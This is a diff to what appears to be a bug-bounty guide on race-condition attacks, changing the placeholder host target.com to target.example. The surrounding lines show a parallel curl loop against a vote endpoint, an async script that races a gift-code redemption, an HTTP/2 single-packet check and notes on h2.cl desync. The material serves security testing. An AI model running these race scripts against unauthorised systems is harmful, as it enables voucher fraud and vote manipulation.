@@ -140,7 +140,7 @@ def handleResponse(req, interesting):
 # Fire 15 simultaneous vote/redeem requests
 for i in $(seq 1 15); do
   curl -s -o /dev/null -w "%{http_code}\n" \
-    -X POST "https://target.com/api/vote" \
+    -X POST "https://target.example/api/vote" \
     -H "Cookie: session=YOUR_SESSION" \
     -H "Content-Type: application/json" \
     -d '{"report_id": "12345", "vote": "up"}' &
@@ -157,7 +157,7 @@ async def race_request(session, url, payload, headers):
         return await r.text()
 
 async def main():
-    url = "https://target.com/redeem"
+    url = "https://target.example/redeem"
     payload = {"code": "GIFT50"}
     headers = {"Cookie": "session=XXXXX"}
     
@@ -187,7 +187,7 @@ grep -rn "\.get(\|\.filter(" --include="*.py" | grep -v "select_for_update"
 ### HTTP/2 Single-Packet Check
 ```bash
 # Verify target supports HTTP/2 (prerequisite for single-packet attack)
-curl -sI --http2 https://target.com | grep -i "HTTP/2\|h2"
+curl -sI --http2 https://target.example | grep -i "HTTP/2\|h2"
 ```
 
 ---
@@ -382,7 +382,7 @@ Two variants depending on what protocol the target speaks:
 - **h2.0 single-frame** (the standard Kettle attack): pure HTTP/2 end-to-end. N requests in one TLS record. Works against any modern HTTPS-fronted target where the front-end advertises `h2` in ALPN. **Default approach.**
 - **h2.cl multi-frame**: front-end speaks HTTP/2 to the client, downgrades to HTTP/1.1 to the back-end. Smuggling-adjacent — you craft an HTTP/2 request whose `Content-Length` confuses the front-end into emitting two HTTP/1.1 requests to the back-end on the same connection. Pairs with HTTP request smuggling (see `hunt-http-smuggling`). Useful when single-packet HTTP/2 is filtered at the front-end but the back-end is reachable in HTTP/1.1.
 
-Detect h2.0 viability via `curl -sI --http2 https://target.com | grep -i HTTP/2`. If the server doesn't speak h2, single-packet is not directly applicable — fall back to "parallel-pipelining" over HTTP/1.1 (much wider race window; usually loses the race against modern backends, but still useful for naive ones).
+Detect h2.0 viability via `curl -sI --http2 https://target.example | grep -i HTTP/2`. If the server doesn't speak h2, single-packet is not directly applicable — fall back to "parallel-pipelining" over HTTP/1.1 (much wider race window; usually loses the race against modern backends, but still useful for naive ones).
 
 ### Race-window estimation methodology
 
